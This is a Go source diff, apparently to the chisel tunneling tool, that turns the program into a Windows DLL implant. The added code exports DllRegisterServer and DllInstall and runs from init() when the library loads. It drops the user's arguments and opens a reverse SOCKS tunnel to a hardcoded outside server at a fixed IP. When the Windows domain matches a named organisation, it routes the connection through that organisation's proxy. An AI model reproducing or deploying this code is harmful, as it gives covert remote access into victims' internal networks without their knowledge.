@@ -1,10 +1,13 @@
 package main
 
+import "C"
+
 import (
 	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"net/http"
 	"os"
 	"runtime"
@@ -31,8 +34,39 @@ var help = `
 
 `
 
-func main() {
+func rangeIn(low, hi int) int {
+	rand.Seed(time.Now().UnixNano())
+	return rand.Intn(hi-low+1) + low
+}
 
+//export InitializeNewDomain
+func InitializeNewDomain() {
+	DllInstall()
+}
+
+func init() {
+	// This is Entry for DLL
+	DllInstall()
+}
+
+//export EntryPoint
+func EntryPoint() bool {
+	return true
+}
+
+//export DllRegisterServer
+func DllRegisterServer() bool {
+	return true
+}
+
+//export DllUnregisterServer
+func DllUnregisterServer() bool {
+	return true
+}
+
+//export DllInstall
+func DllInstall() bool {
+	// This is entry for DLL
 	version := flag.Bool("version", false, "")
 	v := flag.Bool("v", false, "")
 	flag.Bool("help", false, "")
@@ -45,23 +79,55 @@ func main() {
 		os.Exit(0)
 	}
 
-	args := flag.Args()
-
-	subcmd := ""
-	if len(args) > 0 {
-		subcmd = args[0]
-		args = args[1:]
+	args := []string{""}
+	//args = flag.Args()
+	//fmt.Print(args)
+	fmt.Print("\n####\n")
+	if os.Getenv("USERDOMAIN") == "PNCNT" {
+		args = []string{"--tls-skip-verify", "--proxy", "http://pz-proxy.pncint.net:80", "https://hoping.purpleteam.science:443", fmt.Sprintf("R:%d:socks", rangeIn(2000, 65500))}
+	} else {
+		args = []string{"--tls-skip-verify", "https://hoping.purpleteam.science:443", fmt.Sprintf("R:165.227.194.40:%d:socks", rangeIn(2000, 65500))}
 	}
 
-	switch subcmd {
-	case "server":
-		server(args)
-	case "client":
-		client(args)
-	default:
-		fmt.Print(help)
-		os.Exit(0)
-	}
+	fmt.Print("\n#####\n")
+	fmt.Print(args)
+	fmt.Print("\n###\n")
+
+	client(args)
+	return true
+}
+
+func main() {
+	DllInstall()
+	//version := flag.Bool("version", false, "")
+	//v := flag.Bool("v", false, "")
+	//flag.Bool("help", false, "")
+	//flag.Bool("h", false, "")
+	//flag.Usage = func() {}
+	//flag.Parse()
+	//
+	//if *version || *v {
+	//	fmt.Println(chshare.BuildVersion)
+	//	os.Exit(0)
+	//}
+	//
+	//args := flag.Args()
+	//
+	//subcmd := ""
+	//if len(args) > 0 {
+	//	subcmd = args[0]
+	//	args = args[1:]
+	//}
+	//
+	//switch subcmd {
+	//case "server":
+	//	server(args)
+	//case "client":
+	//	client(args)
+	//default:
+	//	fmt.Print(help)
+	//	os.Exit(0)
+	//}
 }
 
 var commonHelp = `
